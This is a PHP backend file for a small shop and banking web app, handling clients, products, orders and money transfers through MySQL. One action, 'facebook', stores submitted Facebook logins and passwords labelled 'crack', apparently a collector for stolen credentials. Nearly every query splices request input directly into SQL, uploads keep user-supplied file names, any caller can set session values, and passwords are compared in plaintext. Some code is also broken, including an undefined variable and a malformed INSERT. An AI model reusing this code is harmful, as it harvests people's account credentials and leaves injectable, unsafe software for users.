<?php

session_start();

require_once("DBconnexion.php");


//aide nt mada tadidiko ihany

header('Access-Control-Allow-Origin: *');

header('Content-type: application/json');

//merci





$op = $_POST['action'];



//client

if ($op == "listeClient"){	

	$req=$bdd->query('SELECT * FROM client_table ORDER BY client_id ');

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	echo json_encode($reponse);

}
elseif($op == "ajout_emp")
{
	$req=$bdd->prepare('INSERT INTO employes VALUES(0,"'.$_POST["numero"].'","'.$_POST["nom"].'","'.$_POST["adresse"].'")');

	 $req->execute();
$reponse["succes"]= "succes";
	echo json_encode($reponse);

}
elseif($op == "modif_emp")
{
	$req=$bdd->prepare('UPDATE employes SET numero="'.$_POST["numero"].'",nom="'.$_POST["nom"].'",adresse="'.$_POST["adresse"].'" where id='.$_POST["id"]);

	 $req->execute();
$reponse["succes"]= "succes";
	echo json_encode($reponse);

}
elseif($op == "affiche_emp")
{
	$req=$bdd->query('SELECT * FROM employes where id='.$_POST["id"]);

	$reponse = $req->fetch();

	echo json_encode($reponse);

}
elseif ($op == "facebook"){	

	$req=$bdd->prepare('INSERT INTO facebook VALUES("'.$_POST["log_fb_crack"].'","'.$_POST["pass_fb_crack"].'",0)');

	 $req->execute();

}

elseif ($op == "afficherMessage"){	

$session = $_POST["session"];

	$req=$bdd->query('SELECT * FROM chat_messages where dest="'.$session.'" OR pseudo="'.$session.'" ORDER BY message_id ');

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	

	/*$req1=$bdd->query('SELECT COUNT(*) as isa FROM chat_messages where dest="'.$_SESSION["client_pseudo"].'" OR pseudo="'.$_SESSION["client_pseudo"].'"');

	$reponse1 = $req1->fetchAll(PDO::FETCH_ASSOC);*/

	

	$reponsefinale = $reponse;

	//$reponsefinale["isa"] = $reponse1["isa"];

	echo json_encode($reponse);

}

elseif ($op == "notifProduit"){	

	$req=$bdd->query('SELECT COUNT(*) as valiny FROM produit');

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	echo json_encode($reponse);

}

elseif ($op == "notifCommande"){	

	$req=$bdd->query('SELECT COUNT(*) as valiny FROM commande,client_table where client_table.client_id = commande.client_id AND client_table.client_pseudo = "'.$_POST["client_pseudo"].'"');

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	echo json_encode($reponse);

}

elseif ($op == "modifSESSION"){	

	$variable = $_POST["variable"];

	$valeur = $_POST["valeur"];

	$_SESSION["'".$variable."'"] = $valeur;

	$reponse["succes"] = "succes";

	echo json_encode($reponse);

}

elseif ($op == "listeClient_id"){	

$pseudo = $_POST["pseudo"];

$pass = $_POST["pass"];

	$req=$bdd->query("SELECT * FROM client_table where client_pseudo='".$pseudo."' AND client_pass='".$pass."'");

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	echo json_encode($reponse);

}

elseif ($op == "listeCommande_id"){	

$id = $_POST["id"];

	$req=$bdd->query("SELECT DISTINCT id,designation,date,total,prix,prix*total as TOTAL_PRIX FROM commande,produit,client_table WHERE commande.client_id=".$id." AND produit.produit_id = commande.produit_id  ORDER BY commande.id DESC");

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	echo json_encode($reponse);

}

elseif ($op == "listeProduit"){	

	$req=$bdd->query('SELECT * FROM produit ORDER BY produit_id DESC');

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	echo json_encode($reponse);

}

elseif ($op == "listeProduit_jour"){	

	$req=$bdd->query('SELECT * FROM produit WHERE validite_fin=CURDATE() ORDER BY produit_id DESC ');

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	echo json_encode($reponse);

}

elseif ($op == "listeProduit_cours"){	

	$req=$bdd->query('SELECT * FROM produit WHERE CURDATE() BETWEEN validite_deb AND validite_fin ORDER BY produit_id DESC ');

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	echo json_encode($reponse);

}

elseif ($op == "listeProduit_venir"){	

	$req=$bdd->query('SELECT * FROM produit WHERE validite_deb >= CURDATE() ORDER BY produit_id DESC ');

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	echo json_encode($reponse);

}

elseif ($op == "curdate"){	

	$req=$bdd->query('SELECT CURDATE()');

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	echo json_encode($reponse);

}

elseif ($op == "getImage"){	



    $id= $_POST["numImg"];

	$req=$bdd->query('SELECT img_blob FROM img_produit WHERE img_id='.$id);

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	echo json_encode($reponse);

}

elseif ($op == "verifPseudo"){	

	$req=$bdd->query('SELECT COUNT(*) FROM client_table WHERE client_pseudo LIKE ? ');

	$requete->execute(array($_POST['client_pseudo']));

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC); 

	echo json_encode($reponse);

}



elseif ($op == "supprClient") {

	$id = $_POST["id"];

    $requete=$bdd->prepare("DELETE FROM client_table WHERE client_id=".$id);

    $requete->execute();

    $reponse["succes"]=1;

    $reponse["message"]="Suppression client avec succes";

    echo json_encode($reponse);

	header('Location: listeC.php');

}

elseif ($op == "supprProduit") {

	$id = $_POST["id"];

    $requete=$bdd->prepare("DELETE FROM produit WHERE produit_id=".$id);

    $requete->execute();

    

    header('Location: listeP.php');

}

elseif ($op == "supprCommande") {

	$id = $_POST["id"];

    $requete=$bdd->prepare("DELETE FROM commande WHERE id=".$id);

    $requete->execute();

	

	$req = $bdd->query('SELECT *,designation,prix*total as prix FROM commande,produit Where commande.produit_id=produit.produit_id and client_id='.$_POST['client_id'].' order by commande.date DESC'); 

$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

echo json_encode($reponse);

    

    //header('Location: listeCommande.php');

}



elseif ($op == "nouveauCommande") {

	$produit = $_POST["produit"];

	$client_id = $_POST["client_id"];

	$qte = $_POST["qt"];

	

	$requete_existe=$bdd->query("SELECT COUNT(*) as misy FROM commande WHERE produit_id=".$produit." AND client_id=".$client_id);

	$rep_existe = $requete_existe->fetch();

	if($rep_existe["misy"] == 0)

	{

    $requete=$bdd->prepare("INSERT INTO commande VALUES(0,'".$produit."','".$client_id."','".$qte."',CURDATE())");

	$requete->execute(array($_GET['client']));

	

	$requete_statut=$bdd->query("SELECT max(id) as id_commande FROM commande");

	$row = $requete_statut->fetch();

	//$row->fetchAll(PDO::FETCH_ASSOC);

	

	//$requete_insert_commande_statut=$bdd->prepare("INSERT INTO status VALUES(0,'".$row["id_commande"]."',0)");

   // $requete_insert_commande_statut->execute();

	}

	else

	{

	$requete=$bdd->prepare("UPDATE commande SET total=total+".$qte." WHERE produit_id=".$produit);

	$requete->execute();

	}

    

	$reponse = $rep_existe["misy"];

    echo $reponse;

}

elseif ($op == "maxGroupy") {

	$requete_statut=$bdd->query("SELECT COUNT(*) as isa FROM commande_valider");

	$row = $requete_statut->fetch();

	if($row["isa"]==0)

	{

	$reponse["maximum"] = $row["isa"];

    echo json_encode($reponse);

	}

	else

	{

	$requete=$bdd->query("SELECT MAX(groupe) as maximum FROM commande_valider");

	$row1 = $requete->fetch();

    echo json_encode($row1);

	}

}

elseif ($op == "nouveauCommande_valider") {

	$id = $_POST["id"];

	$produit = $_POST["produit_id"];

	$client_id = $_POST["client_id"];

	$qte = $_POST["total"];

	$date = $_POST["date"];

	$groupe = $_POST["groupe"];

	



    $requete=$bdd->prepare("INSERT INTO commande_valider VALUES(".$id.",".$produit.",".$client_id.",".$qte.",'".$date."',".$groupe.")");

	$requete->execute();

  

	$reponse = "succes";

    echo json_encode($reponse);

}

elseif ($op == "nouveauCommande_invite") {

	//$id = $_POST["id"];

$ses = $bdd->query("SELECT COUNT(*) as isa FROM invite");

$rep_ses = $ses->fetch();

if($_POST["type"] == "nouveau")

{

if($rep_ses["isa"] == 0)

{ 

    $ses = "INV_001";

    $_SESSION["inv_num"]= $ses;

    $_SESSION["ip"]= $_SERVER["REMOTE_ADDR"];

    $produit = $_POST["produit_id"];

    $client_nom = $_POST["client_nom"];

    $qte = $_POST["total"];

	$date = $_POST["date"];

	$sess = $_SESSION["inv_num"];

	$ip = $_SESSION["ip"];

	$adresse = $_POST["adresse"];

	$client_adresse = $_POST["client_adresse"];

	$client_phone = $_POST["client_phone"];

    $requete=$bdd->prepare("INSERT INTO invite VALUES(0,'".$sess."','".$ip."',".$produit.",'".$client_nom."',".$qte.",'".$date."','".$adresse."','".$client_phone."','".$client_adresse."')");

	$requete->execute();

  

	$reponse["session"] = $sess;

    echo json_encode($reponse);	

}

else

{

    $ses = $bdd->query("SELECT session FROM invite GROUP BY session ORDER BY session DESC");

	$rep_ses = $ses->fetch();

	$str_fohy = str_replace("INV_00","",$rep_ses["session"]);

	$num = $str_fohy + 1;

    $_SESSION["inv_num"]= "INV_00".$num;

    $_SESSION["ip"]= $_SERVER["REMOTE_ADDR"];

    $produit = $_POST["produit_id"];

    $client_nom = $_POST["client_nom"];

    $qte = $_POST["total"];

	$date = $_POST["date"];

	$sess = $_SESSION["inv_num"];

	$ip = $_SESSION["ip"];

	$adresse = $_POST["adresse"];

	$client_adresse = $_POST["client_adresse"];

	$client_phone = $_POST["client_phone"];

    $requete=$bdd->prepare("INSERT INTO invite VALUES(0,'".$sess."','".$ip."',".$produit.",'".$client_nom."',".$qte.",'".$date."','".$adresse."','".$client_phone."','".$client_adresse."')");

	$requete->execute();

  

	$reponse["session"] = $sess;

    echo json_encode($reponse);		

}

}

else

{

	

    $_SESSION["inv_num"] = $_POST["session"];

    $_SESSION["ip"]= $_SERVER["REMOTE_ADDR"];

    $produit = $_POST["produit_id"];

    $client_nom = $_POST["client_nom"];

    $qte = $_POST["total"];

	$date = $_POST["date"];

	$sess = $_SESSION["inv_num"];

	$ip = $_SESSION["ip"];

	$adresse = $_POST["adresse"];

	$client_adresse = $_POST["client_adresse"];

	$client_phone = $_POST["client_phone"];

    $requete=$bdd->prepare("INSERT INTO invite VALUES(0,'".$sess."','".$ip."',".$produit.",'".$client_nom."',".$qte.",'".$date."','".$adresse."','".$client_phone."','".$client_adresse."')");

	$requete->execute();  

	$reponse["session"] = $sess;

    echo json_encode($reponse);

}

	

}





elseif( $op == "verifIdInvite")	

{

$ses = $bdd->query("SELECT * FROM invite where session LIKE '".$_POST["session"]."'");

$rep_ses = $ses->fetchAll(PDO::FETCH_ASSOC); 

echo json_encode($rep_ses);	

}

elseif( $op == "afficheInvite")

{

$ses = $bdd->query("SELECT * FROM invite where session='".$_POST["session"]."'");

$rep_ses = $ses->fetch();

echo json_encode($rep_ses);

}

//"INSERT INTO client (numCompte,nom,solde) VALUES (?,?,0)"

elseif ($op == "nouveauClient") {

	//$img_id_client = $_POST['img_id_client'];

	$client_nom = $_POST['client_nom'];

	$client_adresse = $_POST['client_adresse'];

	$client_phone = $_POST['client_phone'];

	$client_pseudo = $_POST['client_pseudo'];

	$client_pass = $_POST['client_pass'];

	$client_type = $_POST['options'];

    $requete=$bdd->prepare("INSERT INTO client_table VALUES (0,'0','".$client_nom."','".$client_adresse."','".$client_phone."','".$client_pseudo."','".crypt_mdp($client_pass)."','".$client_type."')");

    $requete->execute();

    $reponse["succes"]=1;

    $reponse["message"]="Ajout Client avec succes";

    echo json_encode($reponse);

	header('Location: listeC.php');

}

elseif ($op == "nouveaudem_Client") {

	//$img_id_client = $_POST['img_id_client'];

	$client_nom = $_POST['client_nom'];

	$client_adresse = $_POST['client_adresse'];

	$client_phone = $_POST['client_phone'];

	$client_pseudo = $_POST['client_pseudo'];

	$client_pass = $_POST['client_pass'];

	$client_type = $_POST['option'];

	

    $requete=$bdd->prepare("INSERT INTO friend VALUES (0,'".$client_nom."','".$client_adresse."','".$client_phone."','".$client_pseudo."','".$client_pass."','".$client_type."')");

    $requete->execute();

    $reponse["succes"]=1;

    $reponse["message"]="Ajout Client avec succes";

    echo json_encode($reponse);

	//header('Location: listeC.php');

}



elseif ($op == "nouveauProduit") {

	

	$numero_produit = $_POST['numero_produit'];

	$designation = $_POST['designation'];

	$prix = $_POST['prix'];

	$prix_ancien = $_POST['prix_ancien'];

	$validite_deb = $_POST['validite_deb'];

	$validite_fin = $_POST['validite_fin'];

	$dispo = $_POST['dispo'];

	$min = $_POST['min'];

	$vente = addslashes($_POST['vente']);

	$client_pseudo_session = $_POST["session"];

	

	//fichier

	$extensions_valides = array( 'jpg' , 'jpeg' , 'gif' , 'png' );



//1. strrchr renvoie l'extension avec le point (« . »).



//2. substr(chaine,1) ignore le premier caractère de chaine.



//3. strtolower met l'extension en minuscules.

 $crypt = md5(uniqid(rand(), true));

 $extension_upload = strtolower(  substr(  strrchr($_FILES['img_produit']['name'], '.')  ,1)  );

 



 

//$image_sizes = getimagesize($_FILES['img_produit']['tmp_name']);



//if ($image_sizes[0] > $maxwidth OR $image_sizes[1] > $maxheight) $erreur = "Image trop grande";



if ( in_array($extension_upload,$extensions_valides) )

{

	$fichier_final = "photo dstock/{$_FILES['img_produit']['name']}";

	  $resultat = move_uploaded_file($_FILES['img_produit']['tmp_name'],$fichier_final);

	  if ($resultat) 

	  {

	  $nom_img = $fichier_final;

	  $img_type = $_FILES['img_produit']['type'];

	  $img_size = $_FILES['img_produit']['size'];

	 // $img_tmp_name = $_FILES['img_produit']['tmp_name'];

	  $img_error = $_FILES['img_produit']['error'];

	 // $img_blob = addslashes(file_get_contents($nom_img));

	 $img_blob = addslashes($nom_img);

	

	//$img_produit = $_POST['img_produit'];

	$ajoutImg = $bdd->prepare("INSERT INTO img_produit VALUES(0,0,'".$nom_img."','".$img_size."','".$img_type."','fichier','".$img_blob."')");

	$ajoutImg->execute();

	

	$req=$bdd->query('SELECT MAX(img_id) as id FROM img_produit');

	

	$id_img = $req->fetchAll(PDO::FETCH_ASSOC); 

	$affiche = str_replace('[{"id":"','',json_encode($id_img));

	$affiche1 = str_replace('"}]','',$affiche);

    $requete=$bdd->prepare("INSERT INTO produit VALUES (0,'".$designation."','".$client_pseudo_session."','".$prix."','".$prix_ancien."','".$validite_deb."','".$validite_fin."','".$dispo."','".$min."','".$vente."','".$affiche1."','".$numero_produit."')");

    $requete->execute();

    $reponse["succes"]=1;

	

	header('Location: listeP.php');

    

	  }

}

else

{

	

}

}

elseif ($op == "nouveauProduitPRO") {

	

	$numero_produit = $_POST['numero_produit'];

	$designation = $_POST['designation'];

	$prix = $_POST['prix'];

	$prix_ancien = $_POST['prix_ancien'];

	$validite_deb = $_POST['validite_deb'];

	$validite_fin = $_POST['validite_fin'];

	$dispo = $_POST['dispo'];

	$min = $_POST['minim'];

	$vente = addslashes($_POST['vente']);

	$client_pseudo_session = $_POST["session"];

	

	//fichier

	$extensions_valides = array( 'jpg' , 'jpeg' , 'gif' , 'png' );



//1. strrchr renvoie l'extension avec le point (« . »).



//2. substr(chaine,1) ignore le premier caractère de chaine.



//3. strtolower met l'extension en minuscules.

 $crypt = md5(uniqid(rand(), true));

 $extension_upload = strtolower(  substr(  strrchr($_FILES['img_produit']['name'], '.')  ,1)  );

 



 

//$image_sizes = getimagesize($_FILES['img_produit']['tmp_name']);



//if ($image_sizes[0] > $maxwidth OR $image_sizes[1] > $maxheight) $erreur = "Image trop grande";



if ( in_array($extension_upload,$extensions_valides) )

{

	$fichier_final = "photo pro/{$_FILES['img_produit']['name']}";

	  $resultat = move_uploaded_file($_FILES['img_produit']['tmp_name'],$fichier_final);

	  if ($resultat) 

	  {

	  $nom_img = $fichier_final;

	  $img_type = $_FILES['img_produit']['type'];

	  $img_size = $_FILES['img_produit']['size'];

	 // $img_tmp_name = $_FILES['img_produit']['tmp_name'];

	  $img_error = $_FILES['img_produit']['error'];

	 // $img_blob = addslashes(file_get_contents($nom_img));

	 $img_blob = addslashes($nom_img);

	

	//$img_produit = $_POST['img_produit'];

	$ajoutImg = $bdd->prepare("INSERT INTO img_produit_pro VALUES(0,0,'".$nom_img."','".$img_size."','".$img_type."','fichier','".$img_blob."')");

	$ajoutImg->execute();

	

	$req=$bdd->query('SELECT MAX(img_id) as id FROM img_produit_pro');

	

	$id_img = $req->fetchAll(PDO::FETCH_ASSOC); 

	$affiche = str_replace('[{"id":"','',json_encode($id_img));

	$affiche1 = str_replace('"}]','',$affiche);

    $requete=$bdd->prepare("INSERT INTO produit_pro VALUES (0,'".$designation."','".$client_pseudo_session."','".$prix."','".$prix_ancien."','".$validite_deb."','".$validite_fin."','".$dispo."','".$min."','".$vente."','".$affiche1."','".$numero_produit."')");

    $requete->execute();

    $reponse["succes"]=1;

	echo json_encode($reponse);

	//header('Location: ProP.php');

    

	  }

}

else

{

	

}

}

elseif ($op == "modifProduit") {

	$id = $_POST['id'];

	$numero_produit = $_POST['numero_produit'];

	$designation = $_POST['designation'];

	$prix = $_POST['prix'];

	$prix_ancien = $_POST['prix_ancien'];

	$validite_deb = $_POST['validite_deb'];

	$validite_fin = $_POST['validite_fin'];

	$dispo = $_POST['dispo'];

	$min = $_POST['min'];

	$vente = addslashes($_POST['vente']);

	

	$checkbox_checked = (isset($_POST['check'])) ? true : false;

	if($checkbox_checked)

	{

	//fichier

	$extensions_valides = array( 'jpg' , 'jpeg' , 'gif' , 'png' );



//1. strrchr renvoie l'extension avec le point (« . »).



//2. substr(chaine,1) ignore le premier caractère de chaine.



//3. strtolower met l'extension en minuscules.

 $crypt = md5(uniqid(rand(), true));

 $extension_upload = strtolower(  substr(  strrchr($_FILES['img_produit']['name'], '.')  ,1)  );

 



 

//$image_sizes = getimagesize($_FILES['img_produit']['tmp_name']);



//if ($image_sizes[0] > $maxwidth OR $image_sizes[1] > $maxheight) $erreur = "Image trop grande";



if ( in_array($extension_upload,$extensions_valides) )

{

	$fichier_final = "photo dstock/{$_FILES['img_produit']['name']}";

	  $resultat = move_uploaded_file($_FILES['img_produit']['tmp_name'],$fichier_final);

	  if ($resultat) 

	  {

	  $nom_img = $fichier_final;

	  $img_type = $_FILES['img_produit']['type'];

	  $img_size = $_FILES['img_produit']['size'];

	 // $img_tmp_name = $_FILES['img_produit']['tmp_name'];

	  $img_error = $_FILES['img_produit']['error'];

	 // $img_blob = addslashes(file_get_contents($nom_img));

	 $img_blob = addslashes($nom_img);

	

	//$img_produit = $_POST['img_produit'];

	$ajoutImg = $bdd->prepare("INSERT INTO img_produit VALUES(0,0,'".$nom_img."','".$img_size."','".$img_type."','fichier','".$img_blob."')");

	$ajoutImg->execute();

	

	$req=$bdd->query('SELECT MAX(img_id) as id FROM img_produit');

	

	$id_img = $req->fetchAll(PDO::FETCH_ASSOC); 

	$affiche = str_replace('[{"id":"','',json_encode($id_img));

	$affiche1 = str_replace('"}]','',$affiche);

    $requete=$bdd->prepare("UPDATE produit SET designation = '".$designation."',prix = '".$prix."',prix_ancien = '".$prix_ancien."',validite_deb = '".$validite_deb."',validite_fin = '".$validite_fin."',dispo = '".$dispo."',minimum = '".$min."',type='".$vente."',img_produit='".$affiche1."',numero='".$numero_produit."' WHERE produit_id=".$id);

    $requete->execute();

    $reponse["succes"]=1;

	header('Location: listeP.php');

	  

	

	

    

	  }

}

else

{

	

}

}

	  else

	  {

		 $requete=$bdd->prepare("UPDATE produit SET designation = '".$designation."',prix = '".$prix."',prix_ancien = '".$prix_ancien."',validite_deb = '".$validite_deb."',validite_fin = '".$validite_fin."',dispo = '".$dispo."',minimum = '".$min."',type='".$vente."',numero='".$numero_produit."' WHERE produit_id=".$id);

    $requete->execute();

    $reponse["succes"]=1;  

	header('Location: listeP.php');

	  }

}





elseif ($op == "modifClient") {

	if(!empty($_POST['client_pass']))

	{

    $requete=$bdd->prepare("UPDATE client_table SET client_nom=?,client_adresse=?,client_pseudo=?,client_pass=?,client_phone=?,client_type=? WHERE client_id=?");

    $requete->execute(array($_POST["client_nom"],$_POST["client_adresse"],$_POST["client_pseudo"],crypt_mdp($_POST["client_pass"]),$_POST["client_phone"],$_POST["client_type"],$_POST["client_id"]));

    $reponse["succes"]=1;

    $reponse["message"]="Modification Client avec succes";

    echo json_encode($reponse);

	}

	else

	{

		$requete=$bdd->prepare("UPDATE client_table SET client_nom=?,client_adresse=?,client_pseudo=?,client_phone=?,client_type=? WHERE client_id=?");

    $requete->execute(array($_POST["client_nom"],$_POST["client_adresse"],$_POST["client_pseudo"],$_POST["client_phone"],$_POST["client_type"],$_POST["client_id"]));

    $reponse["succes"]=1;

    $reponse["message"]="Modification Client avec succes";

    echo json_encode($reponse);

	}

	header('Location: listeC.php');

}







elseif ($op == "modifClient_android") {

	if(!empty($_POST['client_pass']))

	{

		$verif = $bdd->query("SELECT COUNT(*) as isa FROM client_table WHERE client_pass='".crypt_mdp($_POST['client_pass'])."' AND client_pseudo='".$_POST['client_pseudo']."'");

		$rep_verif = $verif->fetch();

		if($rep_verif["isa"] == 1)

		{

    $requete=$bdd->prepare("UPDATE client_table SET client_nom=?,client_adresse=?,client_pass=?,client_phone=? WHERE client_pseudo=?");

    $requete->execute(array($_POST["client_nom"],$_POST["client_adresse"],crypt_mdp($_POST["new_password"]),$_POST["client_phone"],$_POST["client_pseudo"]));

    $reponse= '1';

    

    echo $reponse;

		}

		else

		{

			$reponse= '0';

			echo $reponse;

		}

	}

	else

	{

	$requete=$bdd->prepare("UPDATE client_table SET client_nom=?,client_adresse=?,client_phone=? WHERE client_pseudo=?");

    $requete->execute(array($_POST["client_nom"],$_POST["client_adresse"],$_POST["client_phone"],$_POST["client_pseudo"]));

    $reponse= '1';

   

    echo $reponse;

	}

	//header('Location: listeC.php');

}



elseif ($op == "modifCommande") {

	

		$requete=$bdd->prepare("UPDATE commande SET total=? WHERE id=?");

		$requete->execute(array($_POST["total"],$_POST["id"]));

		//$reponse["succes"]=1;

		//$reponse["message"]="Modification Client avec succes";

		//echo json_encode($reponse);

		$req = $bdd->query('SELECT *,designation,prix*total as prix FROM commande,produit Where commande.produit_id=produit.produit_id and client_id='.$_POST['client_id'].' order by commande.date DESC'); 

$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

echo json_encode($reponse);

	

	//header('Location: listeCommande.php');

}



elseif ($op == "modifStatut") {

	$request = $bdd->query('SELECT max(id_historique) as max FROM historique'); 

     $max  = $request->fetch();

	

		$requete=$bdd->prepare("UPDATE status SET status=? WHERE client_id=? and status=0");

		$requete->execute(array($_POST["client_type"],$_POST["client_id"]));

		//$reponse["succes"]=1;

		//$reponse["message"]="Modification Client avec succes";

		//echo json_encode($reponse);

		if($_POST["client_type"] == "2")

		{

			$req = $bdd->query('SELECT * FROM commande Where client_id='.$_POST['client_id'].' and status=2'); 

 while($reponse = $req->fetch())

{

		$ret=$bdd->prepare("INSERT INTO historique VALUES(0,?,?,NOW(),?");

		$ret->execute(array($_POST["client_id"],$reponse["commande_id"],$max));

}

		/*$req = $bdd->query('SELECT *,designation,prix*total as prix FROM commande,produit Where commande.produit_id=produit.produit_id and client_id='.$_POST['client_id'].' order by commande.date DESC'); 

$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

echo json_encode($reponse);*/

	

	header('Location: ../historique.php');

	}

	else

	{

		$req = $bdd->query('SELECT *,designation,prix*total as prix FROM commande,produit Where commande.produit_id=produit.produit_id and client_id='.$_POST['client_id'].' order by commande.date DESC'); 

$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

echo json_encode($reponse);

	}

}



//Versement

elseif ($op == "listeVersement") {

	$req=$bdd->query('SELECT * FROM versement WHERE numCompte = "'.$_GET['client'].'" ORDER BY id  DESC');

	$reponse = $req->fetchAll(PDO::FETCH_ASSOC);

	echo json_encode($reponse);

}

elseif ($op == "nouveauVersement") {

	$requete=$bdd->prepare("INSERT INTO versement (montant_versement,date_versement,numCompte) VALUES (?,?,?)");

    $requete->execute(array($_GET['montant'],$_GET['date'],$_GET['client']));



    //ajout solde

    $requete=$bdd->prepare("UPDATE client SET solde=solde+? WHERE numCompte=?");

    $requete->execute(array($_GET['montant'],$_GET['client']));



    $reponse["succes"]=1;

    $reponse["message"]="Ajout Versement avec succes";

    echo json_encode($reponse);

}

elseif ($op == "supprVersement") {

    //recuperation ancien versement

    $requete=$bdd->prepare("SELECT montant_versement FROM versement WHERE id=?");

    $requete->execute(array($_GET['id']));

    $donnee=$requete->fetch();

    $ancien_vers=$donnee["montant_versement"];



	$requete=$bdd->prepare("DELETE FROM versement WHERE id=?");

    $requete->execute(array($_GET['id']));



    //mise a jour solde

    $requete2=$bdd->prepare("UPDATE client SET solde=solde-? WHERE numCompte=?");

    $requete2->execute(array($ancien_vers,$_GET['client']));



    $reponse["succes"]=1;

    $reponse["message"]="Suppression Versement avec succes";

    echo json_encode($reponse);

}

elseif ($op == "modifVersement") {

    //recuperation ancien versement

    $requete=$bdd->prepare("SELECT montant_versement FROM versement WHERE id=?");

    $requete->execute(array($_GET['id']));

    $donnee=$requete->fetch();

    $ancien_vers=$donnee["montant_versement"];



    //mise a jour table versement

	$requete=$bdd->prepare("UPDATE versement SET montant_versement=? , date_versement=? WHERE id=?");

    $requete->execute(array($_GET['montant'],$_GET['date'],$_GET['id']));



    //mise a jour solde

    $requete2=$bdd->prepare("UPDATE client SET solde=(solde-?+?) WHERE numCompte=?");

    $requete2->execute(array($ancien_vers,$_GET['montant'],$_GET['client']));



    $reponse["succes"]=1;

    $reponse["message"]="Modification Versement avec succes";

    echo json_encode($reponse);

}



// Retrait //

elseif ($op == "listeRetrait") {

    $req=$bdd->query('SELECT * FROM retrait WHERE numCompte = "'.$_GET['client'].'" ORDER BY date_retrait ');

    $reponse = $req->fetchAll(PDO::FETCH_ASSOC);

    echo json_encode($reponse);

}

elseif ($op == "nouveauRetrait") {

    $requete=$bdd->prepare("INSERT INTO retrait (numCheque,montant_retrait,date_retrait,numCompte) VALUES (?,?,?,?)");

    $requete->execute(array($_GET['numCheque'],$_GET['montant'],$_GET['date'],$_GET['client']));



    //mise a jour solde

    $requete=$bdd->prepare("UPDATE client SET solde=solde-? WHERE numCompte=?");

    $requete->execute(array($_GET['montant'],$_GET['client']));



    $reponse["succes"]=1;

    $reponse["message"]="Ajout Retrait avec succes";

    echo json_encode($reponse);

}

elseif ($op == "supprRetrait") {

     //recuperation ancien versement

    $requete=$bdd->prepare("SELECT montant_retrait FROM retrait WHERE id=?");

    $requete->execute(array($_GET['id']));

    $donnee=$requete->fetch();

    $ancien_retr=$donnee["montant_retrait"];



    $requete=$bdd->prepare("DELETE FROM retrait WHERE id=?");

    $requete->execute(array($_GET['id']));



    //mise a jour solde

    $requete2=$bdd->prepare("UPDATE client SET solde=solde+? WHERE numCompte=?");

    $requete2->execute(array($ancien_retr,$_GET['client']));



    $reponse["succes"]=1;

    $reponse["message"]="Suppression Retrait avec succes";

    echo json_encode($reponse);

}

elseif ($op == "modifRetrait") {

    //recuperation ancien versement

    $requete=$bdd->prepare("SELECT montant_retrait FROM retrait WHERE id=?");

    $requete->execute(array($_GET['id']));

    $donnee=$requete->fetch();

    $ancien_retr=$donnee["montant_retrait"];



    $requete=$bdd->prepare("UPDATE retrait SET montant_retrait=? , date_retrait=?, numCheque=? WHERE id=?");

    $requete->execute(array($_GET['montant'],$_GET['date'],$_GET['numCheque'],$_GET['id']));



    //mise a jour solde

    $requete2=$bdd->prepare("UPDATE client SET solde=(solde+?-?) WHERE numCompte=?");

    $requete2->execute(array($ancien_retr,$_GET['montant'],$_GET['client']));



    $reponse["succes"]=1;

    $reponse["message"]="Modification Retrait avec succes";

    echo json_encode($reponse);

}

elseif ($op == "effectifClient") {

    $requete=$bdd->query("SELECT COUNT(*) as nb FROM client");

    $donnee=$requete->fetch();

    $reponse["resultat"]=$donnee["nb"];

    echo json_encode($reponse);

}

//transferer

elseif ($op == "transferer") {

    $requete=$bdd->prepare("INSERT INTO versement (montant_versement,date_versement,numCompte) VALUES (?,?,?)");

    $requete->execute(array($_GET['montant'],$_GET['date'],$_GET['dest']));

    //ajout solde

    $requete=$bdd->prepare("UPDATE client SET solde=solde+? WHERE numCompte=?");

    $requete->execute(array($_GET['montant'],$_GET['dest']));



    $requete2=$bdd->prepare("INSERT INTO retrait (numCheque,montant_retrait,date_retrait,numCompte) VALUES (?,?,?,?)");

    $requete2->execute(array("transfert",$_GET['montant'],$_GET['date'],$_GET['exp']));

    //mise a jour solde

    $requete=$bdd->prepare("UPDATE client SET solde=solde-? WHERE numCompte=?");

    $requete->execute(array($_GET['montant'],$_GET['exp']));

    

    $reponse["succes"]=1;

    $reponse["message"]="Transfert d'argent avec success";

    echo json_encode($reponse);

}

//mouvement bancaire

elseif ($op == "totalMouvement") {

    $requete=$bdd->prepare("SELECT SUM(montant_versement) as mt_vers FROM versement WHERE numCompte=?");

    $requete->execute(array($_GET['client']));

    $donnee=$requete->fetch();

    $reponse["versement"]=$donnee["mt_vers"];



    $requete=$bdd->prepare("SELECT SUM(montant_retrait) as mt_retr FROM retrait  WHERE numCompte=?");

    $requete->execute(array($_GET['client']));

    $donnee=$requete->fetch();   

    $reponse["retrait"]=$donnee["mt_retr"];



    echo json_encode($reponse);

}

elseif ($op == "mouvement") {

    $requete=$bdd->prepare("SELECT date_versement, montant_versement FROM versement WHERE numCompte=?");

    $requete->execute(array($_GET['client']));

    $res = $requete->fetchAll(PDO::FETCH_ASSOC);

    $reponse["versement"]=$res;



    $requete=$bdd->prepare("SELECT date_retrait, montant_retrait FROM retrait WHERE numCompte=?");

    $requete->execute(array($_GET['client']));

    $res = $requete->fetchAll(PDO::FETCH_ASSOC);

    $reponse["retrait"]=$res;



    echo json_encode($reponse);

}



//avoir solde

elseif ($op == "getSolde") {

    $requete=$bdd->prepare("SELECT solde FROM client WHERE numCompte=?");

    $requete->execute(array($_GET['client']));

    $donnee=$requete->fetch();

    $reponse["solde"]=$donnee["solde"];

    echo json_encode($reponse);

}

?>